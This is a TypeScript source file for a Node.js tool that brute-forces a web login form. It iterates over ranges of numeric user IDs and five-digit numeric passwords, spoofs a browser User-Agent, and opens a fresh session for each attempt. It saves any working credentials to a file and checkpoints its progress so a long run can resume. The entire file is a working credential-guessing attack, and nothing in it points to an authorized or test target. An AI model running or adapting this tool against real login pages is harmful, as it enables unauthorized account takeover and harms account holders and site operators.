import axios, { AxiosInstance, AxiosResponse } from "axios";
import * as fs from "fs";
import * as path from "path";
import { loadConfig, type BruteforceConfig } from "./config";
import {
  type CheckpointData,
  type CredentialPair,
  parseCheckpoint,
  serializeCheckpoint,
} from "./checkpoint";
import { isLoginSuccess } from "./loginSuccess";

const TIMEOUT = 15000;
const REQUEST_DELAY = 200;
const MAX_RETRIES = 3;

// File paths
const BASE_DIR = path.dirname(__dirname); // Go up one level from src/ to nodejs/ root
// Save to the project root (where package.json is usually located)
const CHECKPOINT_FILE = path.join(process.cwd(), "checkpoint.json");
const CREDENTIALS_FILE = path.join(process.cwd(), "valid_credentials.txt");

class CredentialTester {
  private readonly cfg: BruteforceConfig;
  private axiosInstance: AxiosInstance;
  private foundCredentials: CredentialPair[] = [];
  private totalTested = 0;

  private currentUserId: number;
  private currentPassword: number;
  private isRunning = true;

  constructor(cfg: BruteforceConfig) {
    this.cfg = cfg;
    this.currentUserId = cfg.idStart;
    this.currentPassword = cfg.passStart;
    this.axiosInstance = axios.create({
      timeout: TIMEOUT,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      },
      maxRedirects: 5,
      validateStatus: () => true, // Accept all status codes
    });
  }

  public loadCheckpoint(): void {
    if (fs.existsSync(CHECKPOINT_FILE)) {
      try {
        const dataRaw = fs.readFileSync(CHECKPOINT_FILE, "utf-8");
        const data = parseCheckpoint(dataRaw);
        this.currentUserId = data.currentUserId ?? this.cfg.idStart;
        this.currentPassword = data.currentPassword ?? this.cfg.passStart;
        this.totalTested = data.totalTested ?? 0;
        this.foundCredentials = data.foundCredentials ?? [];

        console.log(
          `RESUMING from User ID: ${this.currentUserId}, Password: ${this.currentPassword}`
        );
      } catch (error: any) {
        console.error(`Error loading checkpoint: ${error.message}`);
      }
    }
  }

  public saveCheckpoint(): void {
    const data: CheckpointData = {
      currentUserId: this.currentUserId,
      currentPassword: this.currentPassword,
      totalTested: this.totalTested,
      foundCredentials: this.foundCredentials,
      lastUpdated: new Date().toISOString(),
    };
    try {
      fs.writeFileSync(CHECKPOINT_FILE, serializeCheckpoint(data));
    } catch (error: any) {
      console.error(`Error saving checkpoint: ${error.message}`);
    }
  }

  private logSuccess(userId: string, password: string): void {
    const timestamp = new Date().toISOString().replace("T", " ").split(".")[0];
    const entry = `[${timestamp}] User: ${userId} | Pass: ${password}\n`;

    console.log(`\n SUCCESS FOUND: ${userId}:${password}`);
    this.foundCredentials.push({ userId, password });

    try {
      fs.appendFileSync(CREDENTIALS_FILE, entry);
    } catch (error: any) {
      console.error(`Error writing to credentials file: ${error.message}`);
    }
  }

  private async sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  // Attempt login with a fresh instance to avoid cookie pollution
  private async attemptLogin(
    userId: string,
    password: string
  ): Promise<boolean> {
    // Create a fresh instance for each attempt (or at least clear cookies if possible, but fresh instance is safer for axios)
    const freshInstance = axios.create({
      timeout: TIMEOUT,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      },
      maxRedirects: 5,
      validateStatus: () => true,
    });

    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
      try {
        // Get login page to refresh session/CSRF
        await freshInstance.get(this.cfg.loginUrl);

        const payload = new URLSearchParams({
          [this.cfg.userField]: userId,
          [this.cfg.passField]: password,
          [this.cfg.submitField]: this.cfg.submitValue,
        });

        const response: AxiosResponse = await freshInstance.post(
          this.cfg.loginUrl,
          payload,
          {
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
          }
        );

        // Check for successful login by looking at the final URL or content
        const resUrl =
          response.request?.res?.responseUrl || response.config?.url || "";
        const body =
          typeof response.data === "string" ? response.data : undefined;
        return isLoginSuccess(
          resUrl,
          body,
          response.status,
          this.cfg.successMarkers,
        );
      } catch (error: any) {
        if (attempt < MAX_RETRIES - 1) {
          await this.sleep(REQUEST_DELAY * 2);
        } else {
          return false;
        }
      }
    }
    return false;
  }

  private formatNumber(num: number): string {
    return num.toLocaleString();
  }

  public stop(): void {
    console.log("\n\nStopping... Saving progress...");
    this.isRunning = false;
    this.saveCheckpoint();
    process.exit(0);
  }

  public async run(): Promise<void> {
    console.log("\n" + "=".repeat(60));
    console.log(
      "Starting comprehensive ID and password test (Node.js/TypeScript)"
    );
    console.log(`Optimized for Windows & Mac`);
    console.log(`Saving progress to: ${path.basename(CHECKPOINT_FILE)}`);
    console.log(`Saving found keys to: ${path.basename(CREDENTIALS_FILE)}`);
    console.log("=".repeat(60) + "\n");

    const { idStart, idEnd, passStart, passEnd } = this.cfg;
    const totalCombinations = (idEnd - idStart + 1) * (passEnd - passStart + 1);

    // Main Loop
    // We start from currentUserId.
    // For the *first* user (currentUserId), we start from currentPassword.
    // For all subsequent users, we start from PASS_START.

    for (let userId = this.currentUserId; userId <= idEnd; userId++) {
      if (!this.isRunning) break;

      const userIdStr = userId.toString();
      let userFound = false;

      // Determine starting password for this user
      const startPass =
        userId === this.currentUserId ? this.currentPassword : passStart;

      console.log(`Testing User ID: ${userIdStr} | Start Pass: ${startPass}`);

      for (let password = startPass; password <= passEnd; password++) {
        if (!this.isRunning) break;

        // Update state
        this.currentUserId = userId;
        this.currentPassword = password;

        const passwordStr = password.toString().padStart(5, "0");

        // Attempt login
        const success = await this.attemptLogin(userIdStr, passwordStr);
        this.totalTested++;

        if (success) {
          this.logSuccess(userIdStr, passwordStr);
          userFound = true;
          // Optional: break here if we only want one password per user
          // break;
        }

        // Feedback every 100
        if (this.totalTested % 100 === 0) {
          process.stdout.write(
            `\rTested: ${this.formatNumber(
              this.totalTested
            )} | Current: ${userIdStr}:${passwordStr}`
          );
        }

        // Checkpoint every 500
        if (this.totalTested % 500 === 0) {
          this.saveCheckpoint();
        }

        await this.sleep(REQUEST_DELAY);
      }

      this.currentPassword = passStart;

      if (userFound) {
        console.log(`\nFinished User ID: ${userIdStr} (Found Credentials)`);
      }

      this.saveCheckpoint();
    }

    this.printResults();
  }

  private printResults(): void {
    console.log("\n" + "=".repeat(60));
    console.log("TEST COMPLETED");
    console.log(
      `Total combinations tested: ${this.formatNumber(this.totalTested)}`
    );
    console.log("=".repeat(60));
  }
}

async function main(): Promise<void> {
  const cfg = loadConfig();
  const tester = new CredentialTester(cfg);

  // Handle Ctrl+C
  process.on("SIGINT", () => {
    tester.stop();
  });

  tester.loadCheckpoint();
  await tester.run();
}

// Run the main function
if (require.main === module) {
  main().catch(console.error);
}
